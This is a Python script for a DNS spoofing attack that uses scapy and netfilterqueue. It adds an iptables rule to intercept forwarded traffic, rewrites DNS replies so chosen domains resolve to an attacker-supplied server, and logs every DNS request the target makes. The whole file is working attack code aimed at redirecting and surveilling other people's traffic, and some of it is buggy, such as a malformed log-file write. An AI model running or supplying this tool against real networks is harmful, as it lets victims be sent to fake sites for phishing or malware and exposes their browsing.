from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

dns_hosts = {}
dns_log_file_path = "dns_log.txt"


def process_packet(packet):
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        dns_log_file.write(scapy_packet.summary(), "\n")
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After ]:", scapy_packet.summary())
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()


def modify_packet(packet):
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        print("[Not Modified]:", qname)
        return packet
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet


if __name__ == "__main__":
    # ask the user where server is located
    web_server = input("Enter the IP address of the server: ")
    print("All of target's dns requests shall be logged in 'dns_log.txt', so you can analyze the target's behaviour")

    # ask the user which hosts he wants to spoof
    isDone = False
    while not isDone:
        host = input("Enter a host to spoof (e.g. www.google.com): ")
        dns_hosts[bytes(host + ".", encoding="utf-8")] = web_server
        another = input("Add another? (y/n): ")
        if another.lower() == "n" or another.lower() == "no":
            isDone = True

    QUEUE_NUM = 0
    # insert the iptables FORWARD rule
    os.system(f"sudo iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}")
    # instantiate the netfilter queue
    queue = NetfilterQueue()
    with open(dns_log_file_path, 'w') as dns_log_file:
        try:
            # bind the queue number to our callback `process_packet`
            # and start it
            queue.bind(QUEUE_NUM, process_packet)
            queue.run()
        except KeyboardInterrupt:
            # if want to exit, make sure we
            # remove that rule we just inserted, going back to normal.
            os.system("sudo iptables --flush")
